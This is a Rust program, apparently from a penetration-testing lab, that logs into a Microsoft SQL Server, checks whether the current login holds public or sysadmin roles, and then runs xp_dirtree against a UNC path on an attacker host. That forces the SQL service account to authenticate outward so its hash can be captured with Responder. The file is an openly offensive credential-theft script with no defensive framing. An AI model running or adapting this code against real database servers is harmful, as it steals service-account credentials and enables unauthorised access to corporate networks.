use async_std::net::TcpStream;
use anyhow;

use tiberius::{Config, AuthMethod, Client, Query, QueryStream, Row};

async fn db_conn() -> anyhow::Result<Client<TcpStream>> {
    let mut config = Config::new();
    config.host("dc01.corp1.com");
    config.database("master");
    config.port(1433);
    config.trust_cert();

    config.authentication(AuthMethod::Integrated);

    let tcp: TcpStream = TcpStream::connect(config.get_addr()).await?;
    tcp.set_nodelay(true)?;

    let client: Client<TcpStream> = Client::connect(config, tcp).await?;

    Ok(client)
}

async fn get_query(client: &mut Client<TcpStream>, query: &str, is_str: bool) -> anyhow::Result<Vec<String>> {
    let select: Query = Query::new(query);
    let stream: QueryStream = select.query(client).await?;

    let row: Option<Row> = stream.into_row().await?;
    let mut rowtext: Vec<String> = Vec::new();
    if is_str {
        rowtext.push(row.unwrap().get::<&str, _>(0).unwrap().to_string());
    } else {
        rowtext.push(row.unwrap().get::<i32, _>(0).unwrap().to_string());
    }

    Ok(rowtext)
}

async fn trigger_auth(client: &mut Client<TcpStream>) {
    let exec: Query = Query::new("EXEC master..xp_dirtree \"\\\\192.168.49.142\\\\test\"");
    let stream: Result<QueryStream, _> = exec.query(client).await;
    stream.ok();
}

#[async_std::main]
async fn main() {
    println!("[+] Connecting to database...");
    let mut conn: Client<TcpStream> = db_conn().await.expect("[!] Auth failed!");
    println!("[+] Auth OK!");

    let user: Vec<String> = get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap();
    let m_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
    let public_role: Vec<String> = get_query(&mut conn, "SELECT IS_SRVROLEMEMBER('public')", false).await.unwrap();
    let sysadmin_role: Vec<String> = get_query(&mut conn, "SELECT IS_SRVROLEMEMBER('sysadmin')", false).await.unwrap();

    println!("--> Logged in as: {}", user[0]);
    println!("--> Mapped to user: {}", m_user[0]);

    if public_role[0].parse::<i32>().unwrap() == 1 {
        println!("--> User is a member of public role");
    } else {
        println!("--> User is NOT a member of public role");
    }

    if sysadmin_role[0].parse::<i32>().unwrap() == 1 {
        println!("--> User is a member of sysadmin");
    } else {
        println!("--> User is NOT a member of sysadmin");
    }

    println!("[+] Attempting auth back to get svc account hash...Check Responder!");
    trigger_auth(&mut conn).await;

}
